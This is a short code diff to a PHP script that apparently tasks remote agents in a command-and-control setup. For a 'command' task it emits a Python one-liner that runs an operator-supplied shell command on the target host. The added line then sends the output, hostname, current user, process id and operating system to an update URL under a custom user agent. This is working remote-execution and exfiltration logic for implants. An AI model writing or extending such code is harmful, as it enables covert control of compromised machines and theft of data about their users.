@@ -58,7 +58,8 @@
 
             if ($task_action == "command") {
                 # TO DO: Echo appropriate Python one-liner code to do command task here
-                echo "from subprocess import Popen, PIPE; command = '" . $task_secondary . "'; p = Popen(command, stdout=PIPE, stderr=PIPE, shell=True); out, err = p.communicate(); print out";
+                echo "import urllib2, json; from subprocess import Popen, PIPE; command = '" . $task_secondary . "'; p = Popen(command, stdout=PIPE, stderr=PIPE, shell=True); out, err = p.communicate(); post_data = {\"hostname\": hostname, \"current_user\": current_user, \"process_id\": process_id, \"os\": operating_system, \"output\": out, \"error\": err}; request = urllib2.Request(update_url); request.add_header(\"Content-Type\", \"application/json\"); request.add_header(\"User-Agent\", user_agent); f = urllib2.urlopen(request, json.dumps(post_data))";
+                #echo "print update_uri";
 
                 # TO DO: Also include urllib2 code to update command output (we will get the update URI above and include it in the command echo)
 
